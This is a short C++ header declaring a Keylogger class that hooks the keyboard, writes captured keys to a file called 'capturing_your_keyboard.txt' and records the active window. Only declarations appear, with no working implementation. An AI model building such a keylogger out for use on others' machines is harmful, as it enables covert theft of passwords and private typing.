#pragma once
#include "Hook.h"

#include <fstream>
#include <vector>
#include <Psapi.h>
#include <string>

using namespace std;

class Keylogger {
public:
	void start();
	void stop();
	~Keylogger();
private:
	const int BUFFER_SIZE = 10;
	const wstring FILENAME = L"capturing_your_keyboard.txt";
	Hook* hook;
	ofstream logFile;
	HWND lastActiveWindow;

	void keyboardHandler(wchar_t* key);

	static char charBuffer[1024];
	static string wcharToStr(wchar_t* str);
};

